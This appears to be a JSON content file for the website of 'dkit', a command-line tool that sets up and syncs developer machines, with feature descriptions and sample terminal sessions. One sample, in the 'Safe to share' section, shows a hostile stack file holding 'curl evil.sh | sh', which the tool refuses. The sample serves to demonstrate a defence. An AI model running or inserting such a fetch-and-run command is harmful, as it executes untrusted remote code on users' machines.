  "problem": {
    "eyebrow": "# the problem",
    "title": "Every new machine is a weekend lost.",
    "text": "Different installers per OS, forgotten extensions, lost dotfiles. dkit replaces the checklist with one repeatable command.",
    "comparison": [
      {
        "task": "Install tools",
        "byHand": "Look up winget, brew or apt for each one",
        "withDkit": "dkit install git node docker"
      },
      {
        "task": "Editor extensions",
        "byHand": "Reinstall one by one, from memory",
        "withDkit": "Restored from one backup"
      },
      {
        "task": "Git, SSH and shell config",
        "byHand": "Copy dotfiles and hope nothing is missing",
        "withDkit": "dkit migrate restore"
      },
      {
        "task": "Switch OS",
        "byHand": "Rewrite your setup for Windows, macOS or Linux",
        "withDkit": "Same backup, the new OS's installer"
      },
      {
        "task": "Onboard a teammate",
        "byHand": "A wiki page that went stale",
        "withDkit": "dkit team add <repo>"
      },
      {
        "task": "Keep two PCs the same",
        "byHand": "Redo every change on each machine",
        "withDkit": "dkit sync pull"
      },
      {
        "task": "Know what you have",
        "byHand": "Memory",
        "withDkit": "dkit doctor"
      }
    ]
  },
  "why": {
    "eyebrow": "# why dkit",
    "title": "Built for people who dislike surprises.",
    "text": "Every change is planned, shown and confirmed before it happens. Pick a guarantee to see it in action.",
    "guarantees": [
      {
        "title": "Plan, confirm, act",
        "text": "Every change is previewed first. Use --dry-run to see the plan, then approve.",
        "terminal": "$ dkit install docker --dry-run\nplan\n  ○ turn on Virtual Machine Platform  admin prompt\n  ○ install WSL 2                     admin prompt\n  ○ install Docker Desktop            winget\n✓ nothing was changed. Run without --dry-run to apply."
      },
      {
        "title": "One setup, any OS",
        "text": "The same manifest works on Windows, macOS and Linux.",
        "terminal": "# on Windows\n$ dkit scan -o dkit-manifest.json\n# on the new Mac\n$ dkit status dkit-manifest.json\n✓ git   ✓ node   ✓ vscode\n✗ docker  missing, will install with brew\n? install what is missing? (y/N)"
      },
      {
        "title": "Encrypted backups",
        "text": "AES-256-GCM. Secrets removed, SSH keys never exported.",
        "terminal": "$ dkit migrate inspect backup.dkit\n✓ AES-256-GCM, checksums match\nsecrets   <REDACTED>\nssh keys  never exported\n# someone edits the file...\n$ dkit migrate restore backup.dkit\n✗ backup is damaged or tampered. Refusing to restore."
      },
      {
        "title": "Team onboarding",
        "text": "A new teammate runs two commands and has the team's tools.",
        "terminal": "$ dkit team add https://github.com/acme/dev-setup\n✓ connected to \"Acme web team\"\n$ dkit team status\nbaseline  node, git, docker, postgresql\n✓ git   ✗ docker   ✗ postgresql\n? install what is missing? (y/N)"
      },
      {
        "title": "Safe to share",
        "text": "Stacks and team files can only name catalog items, never commands.",
        "terminal": "# a stack file from a stranger\n{ \"tools\": [\"node\"], \"run\": \"curl evil.sh | sh\" }\n$ dkit stack install ./shared.json\n✗ refused: stack files may only list catalog ids.\nnothing was run."
      },
      {
        "title": "Open source",
        "text": "MIT licensed. Add a tool with one catalog entry.",
        "terminal": "# src/core/catalog.ts\n{ id: \"mytool\", name: \"My Tool\",\n  kind: \"tool\", detect, install }\n$ dkit info mytool\n✓ My Tool: winget · brew · apt\nlicense MIT · pull requests welcome"
      }
    ]
  },
  "terminal": [
    {
      "command": "dkit doctor"
    },
    {
      "output": "✓ git 2.47   ✓ node 22   ✗ docker"
    },
    {
      "command": "dkit install docker"
    },
    {
      "output": "plan: enable WSL 2, install Docker Desktop"
    },
    {
      "prompt": "? continue? (y/N) ",
      "answer": "y"
    },
    {
      "output": "✓ docker installed and verified"
    },
    {
      "command": "dkit diagnose"
    },
    {
      "output": "↑ postman 11.18 → 11.20   ✓ no problems"
    },
    {
      "command": "dkit update postman"
    },
    {
      "output": "✓ postman updated"
    },
    {
      "command": "dkit migrate export"
    },
    {
      "output": "✓ backup.dkit written (encrypted)"
    }
  ],
